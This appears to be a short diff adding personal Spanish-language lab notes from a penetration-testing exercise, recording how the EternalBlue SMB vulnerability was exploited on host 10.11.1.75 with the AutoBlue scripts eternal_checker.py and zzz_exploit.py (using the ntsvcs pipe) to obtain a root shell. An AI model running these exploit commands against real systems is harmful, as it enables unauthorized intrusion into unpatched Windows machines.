@@ -1,0 +1,15 @@
+1f88aa9e73f267356f033a42d9320b50
+
+usado autoblue MS10-07 aternal
+
+
+eternal_cheker.py 10.11.1.75
+
+sim modificar nada todo el exploit de serie       el otro da error si usamos smbfolder para cargar shell
+
+
+zzz_exploit.py 10.11.1.75 -pipe ntsvcs
+
+
+y root en la misma terminal
+
